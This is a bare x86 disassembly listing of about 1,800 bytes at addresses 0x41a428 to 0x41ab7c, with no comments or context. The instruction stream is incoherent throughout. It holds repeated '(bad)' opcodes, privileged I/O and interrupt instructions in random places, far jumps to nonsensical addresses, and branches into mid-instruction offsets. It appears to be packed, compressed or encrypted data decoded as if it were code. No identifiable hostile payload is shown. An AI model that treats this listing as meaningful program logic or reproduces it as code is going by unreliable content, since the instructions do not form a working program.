  41a428:	pop    ebx
  41a429:	(bad)  
  41a42b:	mov    bl,0x15
  41a42d:	sti    
  41a42e:	popa   
  41a42f:	mov    WORD PTR [edi],ds
  41a431:	mov    ebx,DWORD PTR [eax+ecx*2-0x8]
  41a435:	inc    ebp
  41a436:	mov    al,0xf8
  41a438:	pushf  
  41a439:	out    dx,al
  41a43a:	xchg   esp,eax
  41a43b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a43c:	in     al,0x63
  41a43e:	pusha  
  41a43f:	mov    bh,0xb3
  41a441:	mov    al,ds:0x2f7aa8f7
  41a446:	sahf   
  41a447:	stc    
  41a448:	or     BYTE PTR [edx+0x3f],dh
  41a44b:	push   edi
  41a44c:	jg     0x41a41b
  41a44e:	test   edi,0xe98f105d
  41a454:	mov    bl,BYTE PTR [edx+0x11]
  41a457:	push   eax
  41a458:	inc    esp
  41a459:	and    DWORD PTR [eax+ebx*2],ecx
  41a45c:	add    al,0xf5
  41a45e:	(bad)  
  41a45f:	mov    edx,0xd1edf208
  41a464:	mov    esi,0x57c00be8
  41a469:	in     eax,dx
  41a46a:	les    eax,FWORD PTR [edx-0x487c926a]
  41a470:	jge    0x41a4bc
  41a472:	sbb    dl,bh
  41a474:	push   ecx
  41a475:	mov    bh,0x7e
  41a477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a478:	pop    ebp
  41a479:	leave  
  41a47a:	aaa    
  41a47b:	mov    dh,0x76
  41a47d:	mov    edx,0xb98d641b
  41a482:	inc    ebx
  41a483:	mov    al,BYTE PTR [edx+esi*1-0x2d]
  41a487:	shl    BYTE PTR [eax-0x36],0x4e
  41a48b:	mov    DWORD PTR [esi],edi
  41a48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a48e:	ret    
  41a48f:	fucomp st(3)
  41a491:	stc    
  41a492:	cli    
  41a493:	ret    
  41a494:	mov    edx,0xf4d8b05
  41a499:	sub    al,0xad
  41a49b:	(bad)  
  41a49c:	jae    0x41a439
  41a49e:	mov    WORD PTR [edi],?
  41a4a0:	xor    al,0x48
  41a4a2:	xchg   esp,eax
  41a4a3:	(bad)  
  41a4a4:	das    
  41a4a5:	cdq    
  41a4a6:	or     al,0xad
  41a4a8:	call   0x17bee835
  41a4ad:	and    al,0xa8
  41a4af:	sti    
  41a4b0:	std    
  41a4b1:	stos   DWORD PTR es:[edi],eax
  41a4b2:	cmc    
  41a4b3:	and    al,0x1
  41a4b5:	dec    edi
  41a4b6:	xor    BYTE PTR [ebx+ebx*1],dh
  41a4b9:	dec    esi
  41a4ba:	pop    eax
  41a4bb:	jge    0x41a47a
  41a4bd:	pop    ss
  41a4be:	pop    edx
  41a4bf:	stos   BYTE PTR es:[edi],al
  41a4c0:	jl     0x41a48a
  41a4c2:	shl    BYTE PTR [esi+0x6cbd107f],0x37
  41a4c9:	pop    edi
  41a4ca:	clc    
  41a4cb:	mov    edx,eax
  41a4cd:	xchg   BYTE PTR gs:[edx+0x3021039b],bh
  41a4d4:	out    0x5a,eax
  41a4d6:	sbb    BYTE PTR [ebx],ch
  41a4d8:	fstp   QWORD PTR [edi]
  41a4da:	push   di
  41a4dc:	into   
  41a4dd:	sahf   
  41a4de:	popf   
  41a4df:	loop   0x41a4b8
  41a4e1:	aad    0x74
  41a4e3:	iret   
  41a4e4:	jg     0x41a4b9
  41a4e6:	call   0x230c282
  41a4eb:	dec    edx
  41a4ec:	xchg   esp,eax
  41a4ed:	pop    ebx
  41a4ee:	push   ebp
  41a4ef:	push   ebp
  41a4f0:	in     al,0x34
  41a4f2:	lods   eax,DWORD PTR ds:[esi]
  41a4f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4f4:	dec    ebx
  41a4f5:	enter  0xfd2c,0x97
  41a4f9:	mov    esi,0xa4d364cc
  41a4fe:	or     al,0xed
  41a500:	xchg   edx,edx
  41a502:	adc    eax,0x65e0747
  41a507:	add    eax,0x3a795b54
  41a50c:	jmp    0xc3d69897
  41a511:	imul   eax,DWORD PTR [edi-0x3f413b8],0x470f7d09
  41a51b:	das    
  41a51c:	adc    edx,edi
  41a51e:	inc    eax
  41a51f:	jae    0x41a51d
  41a521:	adc    DWORD PTR [esi-0x37c75a4f],ecx
  41a527:	jo     0x41a4b7
  41a529:	icebp  
  41a52a:	(bad)  
  41a52b:	shr    DWORD PTR [eax+eax*1],cl
  41a52e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a52f:	pop    eax
  41a530:	cmp    eax,ebp
  41a532:	fild   DWORD PTR [edi+eax*1+0xa]
  41a536:	fldcw  WORD PTR [ebp+ebx*8-0x1d72e7e7]
  41a53d:	inc    edx
  41a53e:	push   es
  41a53f:	rcr    DWORD PTR [esi],1
  41a541:	push   esi
  41a542:	pop    ebp
  41a543:	cmc    
  41a544:	aad    0x88
  41a546:	mov    ebp,0x3d12024d
  41a54b:	pop    edx
  41a54c:	repz cld 
  41a54e:	rcl    DWORD PTR [edx],1
  41a550:	adc    ah,al
  41a552:	add    DWORD PTR [edi],ebx
  41a554:	mul    BYTE PTR [eax]
  41a556:	aad    0x5d
  41a558:	mov    ch,0x10
  41a55a:	(bad)  
  41a55b:	out    dx,eax
  41a55c:	cmp    DWORD PTR [edi+0x46458961],esp
  41a562:	jmp    0x242e1ad0
  41a567:	pop    esi
  41a568:	jmp    0xb1de:0x86edcc44
  41a56f:	lods   eax,DWORD PTR ds:[esi]
  41a570:	sbb    BYTE PTR [ebp-0x1c],ah
  41a573:	arpl   bx,sp
  41a575:	aad    0xee
  41a577:	leave  
  41a578:	lock ror DWORD PTR [esp+ecx*4+0x4a],cl
  41a57d:	ds call 0x8d01570b
  41a583:	cmp    al,BYTE PTR [esi]
  41a585:	add    eax,0x50552ee
  41a58a:	clc    
  41a58b:	ret    0x3142
  41a58e:	hlt    
  41a58f:	mov    ebx,ss
  41a591:	xor    DWORD PTR [edx+ecx*1-0x1a7fa546],ebp
  41a598:	or     al,0x97
  41a59a:	xchg   ebx,eax
  41a59b:	ror    BYTE PTR [edx+eax*1],1
  41a59e:	test   al,0x71
  41a5a0:	mov    esi,0x7842cdc9
  41a5a5:	int3   
  41a5a6:	adc    BYTE PTR [edi],dl
  41a5a8:	retf   
  41a5a9:	sub    eax,0x9280f58c
  41a5ae:	xlat   BYTE PTR ds:[ebx]
  41a5af:	out    dx,al
  41a5b0:	mov    dl,0x3
  41a5b2:	push   ss
  41a5b3:	push   0xffffffd5
  41a5b5:	jl     0x41a58f
  41a5b7:	mov    cl,0x76
  41a5b9:	scas   al,BYTE PTR es:[edi]
  41a5ba:	cmp    al,0xe8
  41a5bc:	inc    ebx
  41a5bd:	ror    DWORD PTR [ecx+0x25a07ea3],cl
  41a5c3:	mov    dl,0xc5
  41a5c5:	pop    eax
  41a5c6:	xchg   ebp,eax
  41a5c7:	push   0x1a
  41a5c9:	mov    ebx,0x4a327708
  41a5ce:	test   BYTE PTR [eax+0x5a35e399],cl
  41a5d4:	loopne 0x41a5ab
  41a5d6:	mov    ds:0x45f41558,eax
  41a5db:	jno    0x41a56c
  41a5dd:	call   0xbd7fb41b
  41a5e2:	hlt    
  41a5e3:	jno    0x41a5b2
  41a5e5:	stos   BYTE PTR es:[edi],al
  41a5e6:	imul   esp,DWORD PTR [eax+0x21edd145],0x7e
  41a5ed:	add    BYTE PTR [edx],dl
  41a5ef:	mov    ecx,0xee0adebb
  41a5f4:	scas   eax,DWORD PTR es:[edi]
  41a5f5:	xchg   ebx,eax
  41a5f6:	lods   al,BYTE PTR ds:[esi]
  41a5f7:	xor    al,0x78
  41a5f9:	arpl   WORD PTR ss:[ebp+0x36],bx
  41a5fd:	and    bl,al
  41a5ff:	and    DWORD PTR [ecx+eax*8+0x6b61bec6],ebp
  41a606:	mov    esp,DWORD PTR [ecx+0xe]
  41a609:	ficom  DWORD PTR [eax]
  41a60b:	imul   ecx,esp,0x2e
  41a60e:	in     eax,dx
  41a60f:	loope  0x41a683
  41a611:	dec    esi
  41a612:	ds pop ds
  41a614:	sub    al,0xc4
  41a616:	out    dx,al
  41a617:	mov    ecx,0x27de53c9
  41a61c:	inc    edx
  41a61d:	push   eax
  41a61e:	push   ds
  41a61f:	in     eax,dx
  41a620:	or     al,0x8a
  41a622:	call   0xdb8630b8
  41a627:	call   0x6ad96b33
  41a62c:	imul   BYTE PTR [ebp-0x202782d]
  41a632:	xlat   BYTE PTR ds:[ebx]
  41a633:	sbb    BYTE PTR [esi+ebp*1+0x41340837],al
  41a63a:	jae    0x41a6ae
  41a63c:	mov    eax,0x85e0e0e1
  41a641:	xor    DWORD PTR ss:[edx],esi
  41a644:	inc    ecx
  41a645:	jo     0x41a5f2
  41a647:	mov    edx,0x4b3b0ed
  41a64c:	mov    ebx,edx
  41a64e:	inc    ecx
  41a64f:	add    bl,dh
  41a651:	rol    DWORD PTR [ebp-0x57f7d0de],1
  41a657:	repnz push es
  41a659:	add    eax,0xd8f31b7a
  41a65e:	lods   eax,DWORD PTR ds:[esi]
  41a65f:	icebp  
  41a660:	cmp    ebx,DWORD PTR [esi+0xd]
  41a663:	test   DWORD PTR [eax+eax*2],ebx
  41a666:	daa    
  41a667:	cs inc esp
  41a669:	arpl   WORD PTR [edx-0x4f],dx
  41a66c:	cmp    BYTE PTR [ebx+0x4c],0x94
  41a670:	xor    BYTE PTR [esi+ebx*2+0x74],al
  41a674:	out    0xba,eax
  41a676:	aad    0xdb
  41a678:	adc    ebp,DWORD PTR [ebp-0x1a1d3762]
  41a67e:	mov    ah,bl
  41a680:	mov    bh,0xf6
  41a682:	xor    al,0x9a
  41a684:	fild   QWORD PTR [ecx+0x58]
  41a687:	dec    ebx
  41a688:	sti    
  41a689:	or     al,BYTE PTR [ebp-0x6263cc8b]
  41a68f:	rcl    dh,0xb2
  41a692:	(bad)  
  41a693:	aaa    
  41a694:	aaa    
  41a695:	or     ch,BYTE PTR ds:0x5ff860d6
  41a69b:	imul   edx,DWORD PTR [ecx+0x34],0xffffffee
  41a69f:	lods   eax,DWORD PTR ds:[esi]
  41a6a0:	shl    DWORD PTR [edx-0x245990e],cl
  41a6a6:	and    al,0x8
  41a6a8:	dec    ebp
  41a6a9:	mov    esp,0xa1ed1a78
  41a6ae:	fidiv  DWORD PTR [ebx]
  41a6b0:	bound  edi,QWORD PTR [eax+0x50]
  41a6b3:	pop    ebp
  41a6b4:	xor    dh,BYTE PTR [esi+edi*2]
  41a6b7:	aam    0x38
  41a6b9:	jl     0x41a6e5
  41a6bb:	pop    ds
  41a6bc:	or     cl,BYTE PTR [ecx]
  41a6be:	mov    ds:0x475fd859,eax
  41a6c3:	cmp    al,0xf6
  41a6c6:	jns    0x41a713
  41a6c8:	ja     0x41a6f3
  41a6ca:	mov    al,ds:0x9ff67f65
  41a6cf:	xchg   edi,eax
  41a6d0:	fist   WORD PTR [edx+0x7d4ab5df]
  41a6d6:	test   DWORD PTR [edx],0x51c9ac7c
  41a6dc:	mov    edx,0xc4a4cbc0
  41a6e1:	outs   dx,DWORD PTR ds:[esi]
  41a6e2:	fwait
  41a6e3:	arpl   WORD PTR [edi-0x77],sp
  41a6e6:	sbb    cl,ah
  41a6e8:	and    eax,0x5f64a0d6
  41a6ed:	call   0x51ff:0xee9194c4
  41a6f4:	fldenv [edx-0x14]
  41a6f7:	das    
  41a6f8:	push   es
  41a6f9:	pop    eax
  41a6fa:	into   
  41a6fb:	add    BYTE PTR [edx+ebp*8-0x44],dl
  41a6ff:	or     eax,0x4ef50545
  41a704:	xchg   ebx,eax
  41a705:	push   edi
  41a706:	push   edx
  41a707:	rcr    DWORD PTR [edi],cl
  41a709:	jmp    0x41a776
  41a70b:	ror    dx,1
  41a70e:	fdiv   DWORD PTR [edi-0x5e]
  41a711:	ficom  WORD PTR [ebx+edi*4+0xfd5b96c]
  41a718:	scas   eax,DWORD PTR es:[edi]
  41a719:	aam    0x20
  41a71b:	iret   
  41a71c:	dec    esp
  41a71d:	mov    edi,0x84b9ae55
  41a722:	inc    esi
  41a723:	rol    BYTE PTR [ecx-0x28],cl
  41a726:	sbb    ebp,ebp
  41a728:	fwait
  41a729:	inc    ecx
  41a72a:	into   
  41a72b:	sbb    eax,0xc0a83f1d
  41a730:	rcr    DWORD PTR [esi+0x1864687],1
  41a736:	add    DWORD PTR [edi],edx
  41a738:	cmp    ecx,DWORD PTR [eax+0x3c]
  41a73b:	mov    bl,0xf0
  41a73d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a73e:	xchg   bl,al
  41a740:	(bad)  
  41a741:	femms  
  41a743:	mov    ds:0xc8d72258,al
  41a748:	test   DWORD PTR [edi-0xb],edi
  41a74b:	sbb    BYTE PTR [edx],bl
  41a74d:	mov    bh,0x4
  41a74f:	sbb    al,BYTE PTR [ebx-0x28b32a4b]
  41a755:	cmc    
  41a756:	stc    
  41a757:	mov    eax,0xf31e5017
  41a75c:	test   eax,0xc42fbfd9
  41a761:	test   DWORD PTR [edx+0x6],ebx
  41a764:	or     DWORD PTR [ecx+0x2e],eax
  41a767:	xlat   BYTE PTR ds:[ebx]
  41a768:	stc    
  41a769:	jl     0x41a72c
  41a76b:	js     0x41a74b
  41a76d:	add    bl,0xe0
  41a770:	mov    ds:0x3e09539,eax
  41a775:	sub    dl,BYTE PTR [edi]
  41a777:	stos   BYTE PTR es:[edi],al
  41a778:	and    eax,0xcd2c7431
  41a77d:	push   esi
  41a77e:	lea    esi,[esi-0x53]
  41a781:	mov    ecx,0x16b510ef
  41a786:	and    DWORD PTR [eax+0x45],0xffffffa9
  41a78a:	int3   
  41a78b:	fs fcmovb st,st(3)
  41a78e:	xchg   esi,eax
  41a790:	mov    BYTE PTR [ecx-0x1ad9e0e6],dh
  41a796:	pop    eax
  41a797:	pop    ds
  41a798:	mov    DWORD PTR [edx],edx
  41a79a:	test   DWORD PTR [esi+0x25],ebp
  41a79d:	and    bl,BYTE PTR [ebp+0x10]
  41a7a0:	dec    esp
  41a7a1:	mov    cl,0xe5
  41a7a3:	clc    
  41a7a4:	arpl   bp,cx
  41a7a6:	fwait
  41a7a7:	loopne 0x41a7bc
  41a7a9:	mov    eax,0x38942b40
  41a7ae:	hlt    
  41a7af:	cmp    al,0x3e
  41a7b1:	or     dl,ch
  41a7b3:	mov    ds:0xae0ce7a3,al
  41a7b8:	gs push esi
  41a7ba:	add    edx,DWORD PTR [esi+0x2cdae616]
  41a7c0:	adc    cl,BYTE PTR [edx]
  41a7c2:	mov    edi,0xc9398d8b
  41a7c7:	iret   
  41a7c8:	add    dl,0xe2
  41a7cb:	dec    esp
  41a7cc:	out    dx,eax
  41a7cd:	icebp  
  41a7ce:	sahf   
  41a7cf:	jp     0x41a7ed
  41a7d1:	(bad)  
  41a7d3:	int3   
  41a7d4:	cdq    
  41a7d5:	push   ebp
  41a7d6:	cmp    DWORD PTR [ebx+esi*2-0x64ff9262],ebp
  41a7dd:	fnstsw WORD PTR [ecx-0x397b9bfb]
  41a7e3:	mov    dh,0x80
  41a7e5:	jnp    0x41a778
  41a7e7:	pop    ebp
  41a7e8:	sbb    BYTE PTR [esi],ch
  41a7ea:	jmp    0x41a7d3
  41a7ec:	ficomp WORD PTR [esi+0x54]
  41a7ef:	mov    DWORD PTR [edi-0x262bbc1c],eax
  41a7f5:	adc    eax,DWORD PTR [ebx-0x19]
  41a7f8:	cmp    al,0x5e
  41a7fa:	jmp    0x592a:0x1e313228
  41a801:	inc    esi
  41a802:	aaa    
  41a803:	push   ecx
  41a804:	push   edx
  41a805:	loop   0x41a7f3
  41a807:	icebp  
  41a808:	mov    cl,0x53
  41a80a:	jl     0x41a85d
  41a80c:	in     al,dx
  41a80d:	push   ebx
  41a80e:	fimul  WORD PTR [ebx+esi*1-0x6c]
  41a812:	sahf   
  41a813:	les    esi,FWORD PTR [eax+0x2927bb59]
  41a819:	sub    eax,0xd58537e4
  41a81e:	adc    bl,BYTE PTR [esi-0x1e]
  41a821:	(bad)  
  41a823:	jnp    0x41a7c3
  41a825:	sub    al,0x94
  41a827:	inc    edx
  41a828:	sub    esi,DWORD PTR [edx]
  41a82a:	(bad)  
  41a82b:	xchg   ebx,eax
  41a82c:	jbe    0x41a861
  41a82e:	push   edi
  41a82f:	fucomip st,st(5)
  41a831:	popa   
  41a832:	sbb    edx,edi
  41a834:	in     eax,dx
  41a835:	stos   DWORD PTR es:[edi],eax
  41a836:	cld    
  41a837:	sti    
  41a838:	add    eax,0xd496698c
  41a83d:	jecxz  0x41a7fc
  41a83f:	or     dh,dl
  41a841:	loopne 0x41a8bf
  41a843:	or     BYTE PTR [edx],dh
  41a845:	das    
  41a846:	ficomp WORD PTR [ebx+0x2a0b9615]
  41a84c:	mov    edi,0x547e2e93
  41a851:	lock lea ebp,[esi+0x7b3ab2a2]
  41a858:	test   al,0xa2
  41a85a:	adc    al,BYTE PTR ds:0xd379995d
  41a860:	pushf  
  41a861:	lahf   
  41a862:	cmp    DWORD PTR ds:0x1d574d34,0xaeb6b03
  41a86c:	cmp    BYTE PTR fs:[edi-0x5d5c383a],bl
  41a873:	stos   DWORD PTR es:[edi],eax
  41a874:	div    DWORD PTR [eax]
  41a876:	mov    eax,0x21a61477
  41a87b:	fs add DWORD PTR gs:[edi],eax
  41a87f:	enter  0xb1ac,0xf5
  41a883:	pop    ecx
  41a884:	stos   DWORD PTR es:[edi],eax
  41a885:	jae    0x41a82a
  41a887:	mov    cl,0x3
  41a889:	sbb    al,0x64
  41a88b:	cmp    edx,DWORD PTR [eax-0x3e]
  41a88e:	push   0x74
  41a890:	or     DWORD PTR [ebx+0x4f8b3650],edx
  41a896:	lahf   
  41a897:	les    ebx,FWORD PTR [ebp-0x60]
  41a89a:	and    DWORD PTR [ebp+esi*4+0x76],edx
  41a89e:	xchg   esp,eax
  41a89f:	mov    esp,0xd76706ab
  41a8a4:	jns    0x41a829
  41a8a6:	mov    ebx,0x4a89af25
  41a8ab:	and    BYTE PTR [ecx],bl
  41a8ad:	xlat   BYTE PTR ds:[ebx]
  41a8ae:	adc    BYTE PTR [ecx-0x12592b7f],al
  41a8b4:	mov    al,BYTE PTR [edi+0x73a60655]
  41a8ba:	add    DWORD PTR [ecx-0x8e22bb3],0x98a201a9
  41a8c4:	inc    DWORD PTR [esi+0x59]
  41a8c7:	fimul  WORD PTR [ecx]
  41a8c9:	jmp    0xd29c8c59
  41a8ce:	sbb    al,0xf8
  41a8d0:	ror    DWORD PTR [edi],cl
  41a8d2:	xor    ah,0xbb
  41a8d5:	je     0x41a939
  41a8d7:	std    
  41a8d8:	mov    eax,ds:0xf0469684
  41a8dd:	test   eax,0x10e18a70
  41a8e2:	aaa    
  41a8e3:	mov    al,0x3c
  41a8e5:	pop    edi
  41a8e6:	lea    edi,[edx]
  41a8e8:	mov    al,0xc5
  41a8eb:	mov    ch,0xba
  41a8ed:	hlt    
  41a8ee:	or     eax,0x47d0b08e
  41a8f3:	add    ch,al
  41a8f5:	iret   
  41a8f6:	sub    BYTE PTR [edx],bh
  41a8f8:	inc    edi
  41a8f9:	js     0x41a883
  41a8fb:	cs cwde 
  41a8fd:	jmp    0x41a8ce
  41a8ff:	out    0xc1,eax
  41a901:	stc    
  41a902:	retf   0x742f
  41a905:	jecxz  0x41a8e2
  41a907:	test   al,0x10
  41a909:	push   0x73
  41a90b:	gs mov ebx,0xa057b7d3
  41a911:	clc    
  41a912:	loope  0x41a8c4
  41a914:	jge    0x41a8cf
  41a916:	iret   
  41a917:	stos   DWORD PTR es:[edi],eax
  41a918:	jp     0x41a8ca
  41a91a:	fwait
  41a91b:	push   0xee5810e7
  41a920:	adc    al,0x67
  41a922:	xlat   BYTE PTR ds:[ebx]
  41a923:	jp     0x41a8e5
  41a925:	(bad)  
  41a926:	dec    edx
  41a927:	mov    eax,0x8b2b4b18
  41a92c:	ret    
  41a92d:	aad    0xf3
  41a92f:	cmp    BYTE PTR [esi+edi*8],0xcf
  41a933:	mov    bl,0x38
  41a935:	cdq    
  41a936:	loopne 0x41a94d
  41a938:	inc    esp
  41a939:	sbb    bh,dl
  41a93b:	jle    0x41a903
  41a93d:	dec    esp
  41a93e:	pop    edx
  41a93f:	inc    esp
  41a940:	adc    ebx,ebp
  41a942:	push   0xc19a46ec
  41a947:	cmp    BYTE PTR [eax],dl
  41a949:	xchg   ebp,eax
  41a94a:	mov    eax,esp
  41a94c:	ins    BYTE PTR es:[edi],dx
  41a94d:	xchg   ebp,eax
  41a94e:	lods   al,BYTE PTR fs:[esi]
  41a950:	popf   
  41a951:	add    DWORD PTR ds:0x836458e3,ebx
  41a957:	jae    0x41a96b
  41a959:	pushf  
  41a95a:	add    BYTE PTR [ecx+0x57],bl
  41a95d:	jne    0x41a9be
  41a95f:	jl     0x41a997
  41a961:	xchg   ecx,eax
  41a962:	(bad)  
  41a963:	push   ss
  41a964:	inc    edx
  41a965:	mov    dh,0x56
  41a967:	mov    dh,0x1f
  41a969:	enter  0xfbc2,0xfc
  41a96d:	cmp    al,0x38
  41a96f:	adc    BYTE PTR [esi],al
  41a971:	adc    al,BYTE PTR [esi]
  41a973:	pop    es
  41a974:	fiadd  DWORD PTR [edi+0x75]
  41a977:	inc    ebp
  41a978:	les    esi,FWORD PTR [ebx+0x5334e8c6]
  41a97e:	jmp    0x6d67795
  41a983:	ret    
  41a984:	fstp   QWORD PTR [eax+ebp*4+0x43b4b05e]
  41a98b:	into   
  41a98c:	mov    eax,ds:0x8c9be4f9
  41a991:	sbb    DWORD PTR [edi+0x56],0xc437d07c
  41a998:	(bad)  
  41a99a:	aad    0xf8
  41a99c:	xor    eax,0x65881398
  41a9a1:	pop    ss
  41a9a2:	stos   BYTE PTR es:[edi],al
  41a9a3:	push   edi
  41a9a4:	pop    eax
  41a9a5:	mov    ch,0xf7
  41a9a7:	outs   dx,DWORD PTR cs:[esi]
  41a9a9:	mov    WORD PTR [edi],cs
  41a9ab:	jne    0x41a94c
  41a9ad:	push   edi
  41a9ae:	inc    ebx
  41a9af:	into   
  41a9b0:	scas   eax,DWORD PTR es:[edi]
  41a9b1:	or     DWORD PTR [eax-0x79],edi
  41a9b4:	jne    0x41a95b
  41a9b6:	xchg   esp,eax
  41a9b7:	ins    DWORD PTR es:[edi],dx
  41a9b8:	push   eax
  41a9b9:	shl    BYTE PTR [edi-0x6f8bbacc],1
  41a9bf:	mov    ch,0x6f
  41a9c1:	mov    fs,WORD PTR [esi-0x3a]
  41a9c4:	dec    eax
  41a9c5:	adc    BYTE PTR [edi-0xa],ah
  41a9c8:	nop
  41a9c9:	aas    
  41a9ca:	rol    BYTE PTR [edi-0x55792664],1
  41a9d0:	xchg   ebx,eax
  41a9d1:	xor    DWORD PTR [esi],ecx
  41a9d3:	in     eax,dx
  41a9d4:	ins    BYTE PTR es:[edi],dx
  41a9d5:	bound  ecx,QWORD PTR [edx]
  41a9d7:	sbb    al,BYTE PTR [ecx-0x4660dffe]
  41a9dd:	ins    DWORD PTR es:[edi],dx
  41a9de:	mov    dl,0x2
  41a9e0:	inc    edx
  41a9e1:	inc    ebp
  41a9e2:	inc    eax
  41a9e3:	sti    
  41a9e4:	adc    al,0x76
  41a9e6:	test   al,0x99
  41a9e9:	and    eax,eax
  41a9eb:	lods   eax,DWORD PTR ds:[esi]
  41a9ec:	outs   dx,DWORD PTR ds:[esi]
  41a9ed:	(bad)  
  41a9ee:	shl    BYTE PTR [ebx+0x643b59ca],cl
  41a9f4:	mov    cl,0xbe
  41a9f6:	arpl   WORD PTR [esi],sp
  41a9f8:	pop    ss
  41a9f9:	push   ds
  41a9fa:	jge    0x41aa70
  41a9fc:	mov    DWORD PTR [esi-0x24],esi
  41a9ff:	sbb    al,0x64
  41aa01:	sahf   
  41aa02:	cs xchg ebx,eax
  41aa04:	push   0x4b
  41aa06:	xchg   BYTE PTR [eax-0x53],cl
  41aa09:	sub    eax,0x92de1897
  41aa0e:	jns    0x41aa4c
  41aa10:	mov    ebx,0x627c3e03
  41aa15:	and    BYTE PTR [ecx],0xfb
  41aa18:	mov    esi,0x49dd25de
  41aa1d:	add    BYTE PTR [bp+0x6154],al
  41aa22:	pop    ds
  41aa23:	xor    dl,BYTE PTR [ecx+0x12a5d48b]
  41aa29:	ror    DWORD PTR [ebx+0xd61c489],1
  41aa2f:	push   eax
  41aa30:	fwait
  41aa31:	out    0xa0,eax
  41aa33:	push   ebp
  41aa34:	mov    esp,DWORD PTR [eax-0x2390cbd1]
  41aa3a:	fcom   DWORD PTR [ebx+edi*1-0x13]
  41aa3e:	jecxz  0x41aa18
  41aa40:	int    0xd3
  41aa42:	sbb    ah,ah
  41aa44:	push   eax
  41aa45:	cmp    ch,BYTE PTR [ebp+0x49]
  41aa48:	lds    eax,FWORD PTR [ecx+edx*4+0x5c]
  41aa4c:	inc    ecx
  41aa4d:	inc    bh
  41aa4f:	sub    eax,0xe9c22ee0
  41aa54:	(bad)  
  41aa55:	mov    ch,0xbd
  41aa57:	imul   esi,ecx,0xffffffcf
  41aa5a:	push   es
  41aa5b:	mov    al,BYTE PTR [edi+0x5f]
  41aa5e:	fdivr  QWORD PTR [edx]
  41aa60:	mov    bh,0x5d
  41aa62:	sub    ebx,DWORD PTR [eax]
  41aa64:	in     al,dx
  41aa65:	push   ebx
  41aa66:	mov    edi,0x139507b6
  41aa6b:	loopne 0x41aa6c
  41aa6d:	fdecstp 
  41aa6f:	push   esi
  41aa70:	xchg   edx,eax
  41aa71:	and    al,0x8c
  41aa73:	or     ecx,esp
  41aa75:	inc    edx
  41aa76:	inc    eax
  41aa77:	cmp    eax,0x3521a4ca
  41aa7c:	enter  0xa095,0xb6
  41aa80:	jne    0x41aa1b
  41aa82:	xor    al,0xdf
  41aa84:	xchg   ecx,eax
  41aa85:	dec    esi
  41aa86:	ins    DWORD PTR es:[edi],dx
  41aa87:	or     DWORD PTR [edx+0x69],esp
  41aa8a:	mov    al,ds:0x6be4b248
  41aa8f:	sti    
  41aa90:	and    eax,0x878e6872
  41aa95:	int3   
  41aa96:	and    ecx,DWORD PTR [esp+ebx*4]
  41aa99:	mov    al,0x63
  41aa9b:	jge    0x41aaac
  41aa9d:	mov    al,0xa6
  41aa9f:	or     dl,BYTE PTR [ebx]
  41aaa1:	cmp    al,0x92
  41aaa3:	daa    
  41aaa4:	test   DWORD PTR [esp+ecx*8+0x5d],ebp
  41aaa8:	push   edx
  41aaa9:	or     eax,0xdfe3b69e
  41aaae:	jne    0x41aa45
  41aab0:	mov    cl,0x57
  41aab2:	push   ds
  41aab3:	out    dx,al
  41aab4:	xchg   edi,eax
  41aab5:	mov    eax,ds:0x89f30b8c
  41aaba:	lahf   
  41aabb:	fidivr DWORD PTR [ebx+eiz*8+0x1b618784]
  41aac2:	add    eax,0xd9c13d9c
  41aac7:	test   eax,0xfd8fce49
  41aacc:	sbb    eax,0x3a065ece
  41aad1:	pop    es
  41aad2:	repz dec eax
  41aad4:	stc    
  41aad5:	mov    cl,0x86
  41aad7:	ror    DWORD PTR [ecx+eax*4+0x14],0xd6
  41aadc:	push   ebp
  41aadd:	loop   0x41ab45
  41aadf:	addr16 inc ecx
  41aae1:	sti    
  41aae2:	ins    BYTE PTR es:[edi],dx
  41aae3:	mov    ds:0x8ff57dd2,al
  41aae8:	pop    ds
  41aae9:	push   ds
  41aaea:	hlt    
  41aaeb:	jg     0x41aa94
  41aaed:	retf   
  41aaee:	rol    BYTE PTR [esp+ebx*1],1
  41aaf1:	push   ecx
  41aaf2:	or     al,0x90
  41aaf4:	sub    eax,0x80f02555
  41aaf9:	jl     0x41aadb
  41aafb:	adc    DWORD PTR [esi],ebp
  41aafd:	sbb    al,0xf7
  41aaff:	mov    ebx,0x55c7cb91
  41ab04:	loop   0x41ab6a
  41ab06:	mov    ds:0x364c4617,eax
  41ab0b:	jne    0x41aa9e
  41ab0d:	aad    0xf9
  41ab0f:	sub    ebx,eax
  41ab11:	addr16 mov cl,0x54
  41ab14:	mov    edi,0xbfaa058d
  41ab19:	not    ah
  41ab1b:	xor    DWORD PTR [esi+0x20b82f2d],0x5953701e
  41ab25:	sub    DWORD PTR [edi+0x7e],ecx
  41ab28:	and    BYTE PTR [eax],al
  41ab2a:	lea    edx,[edx-0x424d1cd4]
  41ab30:	mov    bl,0x50
  41ab32:	mov    edi,DWORD PTR [ebp-0x56]
  41ab35:	stos   BYTE PTR es:[edi],al
  41ab36:	pop    edx
  41ab37:	inc    esi
  41ab38:	test   al,0xa3
  41ab3a:	fisttp WORD PTR [ecx]
  41ab3c:	add    BYTE PTR [edi-0x48],bl
  41ab3f:	out    dx,eax
  41ab40:	cmp    DWORD PTR [edi],esp
  41ab42:	xlat   BYTE PTR ds:[ebx]
  41ab43:	mov    DWORD PTR fs:[edi],edx
  41ab46:	retf   
  41ab47:	xchg   edi,eax
  41ab48:	dec    edx
  41ab49:	mov    al,ds:0x5e7af6e0
  41ab4e:	jg     0x41ab1b
  41ab50:	imul   edi,DWORD PTR [esi-0x62],0xf9604a7e
  41ab57:	in     eax,0xf9
  41ab59:	sbb    al,0x22
  41ab5b:	mov    ebx,0x2900df46
  41ab60:	fsubr  QWORD PTR [esi+0x5af4df75]
  41ab66:	int3   
  41ab67:	sub    dl,al
  41ab69:	sbb    al,BYTE PTR [edx-0x7]
  41ab6c:	xchg   ebp,eax
  41ab6d:	std    
  41ab6e:	jb     0x41ab99
  41ab70:	adc    DWORD PTR [ecx+0x5e],ebx
  41ab73:	xchg   edi,eax
  41ab74:	popf   
  41ab75:	dec    ecx
  41ab76:	push   0xfffffff9
  41ab78:	not    DWORD PTR [ebx]
  41ab7a:	icebp  
  41ab7b:	xchg   edx,eax
  41ab7c:	add    BYTE PTR [ebx-0x7387311d],0x35
